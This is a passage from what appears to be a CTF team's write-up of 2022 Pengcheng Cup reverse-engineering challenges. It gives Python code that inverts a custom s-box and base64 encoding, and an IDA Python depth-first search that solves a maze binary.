</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>box1 = sbox[0:64]
</span></span><span class=line><span class=cl>box2 = sbox[64:128]
</span></span><span class=line><span class=cl>box3 = sbox[128:192]
</span></span><span class=line><span class=cl>idx_1, idx_2, idx_3 = sbox[192], sbox[193], sbox[194]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>inp = bytearray(b&#34;XzD+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D=\x00&#34;)
</span></span><span class=line><span class=cl>print(len(inp))
</span></span><span class=line><span class=cl>out = bytearray([0] * 45)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for j in range(9):
</span></span><span class=line><span class=cl>    for i in range(5):
</span></span><span class=line><span class=cl>        idx = Maps.find(inp[j*5+i])
</span></span><span class=line><span class=cl>        if idx == -1: 
</span></span><span class=line><span class=cl>            idx = 0
</span></span><span class=line><span class=cl>        v12 = (idx_2 + box1[(idx_1 + idx) &amp; 0x3f]) &amp; 0x3f
</span></span><span class=line><span class=cl>        v14 = box3[(idx_3 + box2[v12]) &amp; 0x3f]
</span></span><span class=line><span class=cl>        out[j*5+i] = Maps[v14]
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        idx_1 = (idx_1 + 1) &amp; 0x3F
</span></span><span class=line><span class=cl>print(idx_1)
</span></span><span class=line><span class=cl>out
</span></span></code></pre></td></tr></table></div></div><p>逆推</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>box1 = sbox[0:64]
</span></span><span class=line><span class=cl>box2 = sbox[64:128]
</span></span><span class=line><span class=cl>box3 = sbox[128:192]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>inp = bytearray(b&#34;ksPhS/34MXifj+Ibtjud2Tikj5HkA7iTpbaNELBebOaIm&#34;)
</span></span><span class=line><span class=cl>print(len(inp))
</span></span><span class=line><span class=cl>out = bytearray([0] * 45)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for j in range(9):
</span></span><span class=line><span class=cl>    for i in range(5):
</span></span><span class=line><span class=cl>        index = 44 - (j*5+i)
</span></span><span class=line><span class=cl>        v14 = Maps.find(inp[index])
</span></span><span class=line><span class=cl>        v12 = box2.index(box3.index(v14))
</span></span><span class=line><span class=cl>        idx = (box1.index(v12) - index) &amp; 0x3f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        out[index] = Maps[idx]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>out
</span></span></code></pre></td></tr></table></div></div><p>table replace之后decode</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>baseMaps</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>newMaps</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;XiIzDuAoGlaK6JcjM3g/9YQmHBOsxn1hLZ4w7Tt0PV5pNqUFC+rE2dSfyvWe8kRb=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;cAJ7BzX+6zHrHwnTc/i7Bz6f6t6EBQDvc/xfHt9d6S9=&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>btext</span> <span class=o>=</span> <span class=n>out</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=n>out</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=n>newMaps</span><span class=p>,</span> <span class=n>baseMaps</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>btext</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=maze>maze</h3><p>简单dfs</p><p>import structure</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>typedef struct TreeNode {
</span></span><span class=line><span class=cl>    struct TreeNode* parant;
</span></span><span class=line><span class=cl>    struct TreeNode* left;
</span></span><span class=line><span class=cl>    struct TreeNode* right;
</span></span><span class=line><span class=cl>    _BYTE arg0;
</span></span><span class=line><span class=cl>    _BYTE arg1;
</span></span><span class=line><span class=cl>    _BYTE arg2;
</span></span><span class=line><span class=cl>    _BYTE pass_flag;
</span></span><span class=line><span class=cl>    _DWORD padding;
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>} Node;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[18];
</span></span><span class=line><span class=cl>} Map1;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[24];
</span></span><span class=line><span class=cl>} Map2;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[30];
</span></span><span class=line><span class=cl>} Map3;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[30];
</span></span><span class=line><span class=cl>} Map4;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[24];
</span></span><span class=line><span class=cl>} Map5;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    char parent[3];
</span></span><span class=line><span class=cl>    char child[18];
</span></span><span class=line><span class=cl>} Map6;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typedef struct {
</span></span><span class=line><span class=cl>    Map1 maze1;
</span></span><span class=line><span class=cl>    Map2 maze2;
</span></span><span class=line><span class=cl>    Map3 maze3;
</span></span><span class=line><span class=cl>    Map4 maze4;
</span></span><span class=line><span class=cl>    Map5 maze5;
</span></span><span class=line><span class=cl>    Map6 maze5;
</span></span><span class=line><span class=cl>} MapsArray;
</span></span></code></pre></td></tr></table></div></div><p>调起来整个链子create struct 拿到首末address xref逆推</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import idaapi
</span></span><span class=line><span class=cl>import idc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nodeSize = ida_struct.get_struc_size(ida_struct.get_struc_id(&#39;TreeNode&#39;))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def create_struct(baddr):
</span></span><span class=line><span class=cl>    ida_bytes.del_items(baddr, nodeSize, ida_bytes.DELIT_DELNAMES)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    return idc.create_struct(baddr, -1, &#39;TreeNode&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class MazeNode:
</span></span><span class=line><span class=cl>    def __init__(self, baseAddr): self.baseAddr = baseAddr
</span></span><span class=line><span class=cl>    def addr(self): return self.baseAddr
</span></span><span class=line><span class=cl>    def value(self): return ida_bytes.get_qword(self.baseAddr)
</span></span><span class=line><span class=cl>    def parent(self): return MazeNode(ida_bytes.get_qword(self.baseAddr))
</span></span><span class=line><span class=cl>    def left(self): return MazeNode(ida_bytes.get_qword(self.baseAddr + 8))
</span></span><span class=line><span class=cl>    def right(self): return MazeNode(ida_bytes.get_qword(self.baseAddr + 16))
</span></span><span class=line><span class=cl>    def arg0(self): return ida_bytes.get_byte(self.baseAddr + 24)
</span></span><span class=line><span class=cl>    def arg1(self): return ida_bytes.get_byte(self.baseAddr + 25)
</span></span><span class=line><span class=cl>    def arg2(self): return ida_bytes.get_byte(self.baseAddr + 26)
</span></span><span class=line><span class=cl>    def pass_flag(self): return ida_bytes.get_byte(self.baseAddr + 27)
</span></span><span class=line><span class=cl>    def padding(self): return ida_bytes.get_dword(self.baseAddr + 28)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>baseAddr = 0x00156D850
</span></span><span class=line><span class=cl>parent = MazeNode(baseAddr)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def mazeHandler(p, flag, arr):
</span></span><span class=line><span class=cl>    addr = p.addr()
</span></span><span class=line><span class=cl>    create_struct(addr)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    if addr == 0x0156DFA0:
</span></span><span class=line><span class=cl>        print(&#34;find the flag: &#34;, flag)
</span></span><span class=line><span class=cl>        return flag
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    arr.append(addr)
</span></span><span class=line><span class=cl>    for item in [i for i in DataRefsTo(addr) if i not in arr]:
</span></span><span class=line><span class=cl>        ref = MazeNode(item)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if (ref.parent().addr() == addr and ref.arg0() != 1):
</span></span><span class=line><span class=cl>            #print(&#34;parent&#34;, hex(addr), &#34;-&gt;&#34;, hex(item))
</span></span><span class=line><span class=cl>            mazeHandler(ref, &#39;l&#39;+flag, arr.copy())
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if (ref.left().addr() == addr and ref.arg1() != 1):
</span></span><span class=line><span class=cl>            #print(&#34;left&#34;, hex(addr), &#34;-&gt;&#34;, hex(item))
</span></span><span class=line><span class=cl>            mazeHandler(ref, &#39;r&#39;+flag, arr.copy())
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if (ref.right().addr() == addr and ref.arg2() != 1):
</span></span><span class=line><span class=cl>            #print(&#34;right&#34;, hex(addr), &#34;-&gt;&#34;, hex(item))
</span></span><span class=line><span class=cl>            mazeHandler(ref, &#39;t&#39;+flag, arr.copy())
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mazeHandler(parent, &#34;&#34;, [])
</span></span><span class=line><span class=cl>print(&#39;stop&#39;)
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/%E9%B9%8F%E5%9F%8E%E6%9D%AF/>鹏城杯</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/actf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 ACTF SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/xyb-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 祥云杯 SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>